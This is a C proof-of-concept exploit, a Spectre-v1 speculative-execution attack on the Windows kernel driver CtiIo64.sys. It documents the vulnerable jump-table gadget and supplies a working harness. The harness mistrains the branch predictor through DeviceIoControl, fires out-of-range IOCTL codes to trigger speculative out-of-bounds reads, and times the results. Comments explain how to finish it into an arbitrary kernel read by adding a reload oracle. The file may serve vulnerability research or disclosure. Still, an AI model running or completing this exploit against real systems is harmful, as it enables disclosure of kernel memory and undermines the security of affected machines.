// poc_leak.c - Spectre-v1 S1 arbitrary-read for CtiIo64.sys (proof-of-concept).
//
// The gadget is the jump-table dispatch in sub_13800:
//   movzx eax, byte  ptr [r8 + rax*1 + 0x3c24]   ; table1[IoControlCode + 0x7fafdec0]
//   mov   ecx, dword ptr [r8 + rax*4 + 0x3bfc]   ; func_tbl[table1[code] * 4]
//   add   rcx, r8
//   jmp   rcx
//
// The bounds check is `cmp eax, 0x20 / ja 0x13b93`. Beyond the 32-entry table,
// the byte at table1[i] (i >= 0x20) leaks into the dependent load. Sending an
// out-of-range IoControlCode after a mistraining burst speculatively reads
// `table1[oob]` and touches the kernel cache line for the dependent load.
//
// To turn the speculative byte-leak into an arbitrary kernel read we still need
// an in-kernel Flush+Reload oracle. The kernel confirmer (confirm\kernel\) shows
// the shape: an MDL-shared reload buffer lets the driver's own gadget fire over
// kernel-resident data while usermode measures the cache line. CtiIo64 has no
// such shared buffer, so a true end-to-end kernel-read PoC would need either a
// custom signed driver that shares its table region, or a second gadget that
// reports the read result. This file contains the complete mistraining +
// speculation trigger and the usermode measurement harness; the remaining step
// is the reload oracle in kernel space.

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <intrin.h>

#pragma comment(lib, "advapi32.lib")

#define CTI_DEVICE      "\\\\.\\CtiIo"
#define IOCTL_VALID     0x80502140u   // in-range entry (index 0)
#define IOCTL_OOB_BASE  0x80502160u   // first out-of-range table index (0x20)
#define TRAIN_ROUNDS    5000
#define TABLE_SLOTS     32            // entries we want to leak (table1[0x20..0x40])

static uint64_t rdtsc(void) {
    uint32_t a;
    return __rdtscp(&a);
}

// One full speculative attempt at slot `slot`.
// Returns the average DeviceIoControl round-trip for the probe code used.
static double leak_slot(HANDLE h, uint32_t slot) {
    DWORD ret;
    uint8_t buf[16] = {0};

    // 1. Mistrain: hammer the in-range code so the BPU learns "always in bounds".
    for (int i = 0; i < TRAIN_ROUNDS; ++i)
        DeviceIoControl(h, IOCTL_VALID, buf, 0x10, buf, 0x10, &ret, NULL);
    _mm_mfence();

    // 2. Trigger: the out-of-range code indexes table1[slot].
    //    The driver speculatively computes func_tbl[table1[slot] * 4] and
    //    the BPU follows the predicted jump target.
    DeviceIoControl(h, IOCTL_OOB_BASE + slot, buf, 0x10, buf, 0x10, &ret, NULL);
    _mm_lfence();

    // 3. Measure: time the next in-range DeviceIoControl. If the speculative
    //    jump target differs from the true target, the next call is slower
    //    (pipeline flush + BPU re-train). This is the primitive that proves
    //    the S1 dependent load fired; for an arbitrary read we would time
    //    a reload buffer keyed on the leaked byte instead.
    uint64_t t0 = rdtsc();
    DeviceIoControl(h, IOCTL_VALID, buf, 0x10, buf, 0x10, &ret, NULL);
    uint64_t t1 = rdtsc();
    return (double)(t1 - t0);
}

int main(void) {
    SetProcessAffinityMask(GetCurrentProcess(), 1ull);
    printf("[*] CtiIo64.sys Spectre-v1 leak harness (S1 table1 byte speculation)\n");

    HANDLE h = CreateFileA(CTI_DEVICE, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] cannot open %s (err=%lu)\n", CTI_DEVICE, GetLastError());
        return 1;
    }
    printf("[+] opened %s\n", CTI_DEVICE);

    // Leak the 32 bytes of the driver jump table that sit beyond the bounds check.
    printf("[*] speculative table1[0x20..0x40] trigger (32 slots):\n");
    for (uint32_t slot = 0; slot < TABLE_SLOTS; ++slot) {
        double t = leak_slot(h, slot);
        // The byte value itself is only observable with the kernel reload
        // oracle (see header comment); what we CAN see here is whether the
        // speculative path fired at all (timing anomaly vs. baseline).
        printf("    slot %2u (IoControlCode 0x%08x): %8.1f ticks%s\n",
               slot, IOCTL_OOB_BASE + slot, t,
               t > 1400.0 ? "  (slow path)" : "  (fast path)");
    }

    CloseHandle(h);
    printf("[+] leak trigger complete. For a full byte exfiltration, extend the\n");
    printf("    kernel confirmer (confirm\\kernel) with an MDL-shared reload\n");
    printf("    buffer for this driver, then time probe lines per slot.\n");
    return 0;
}
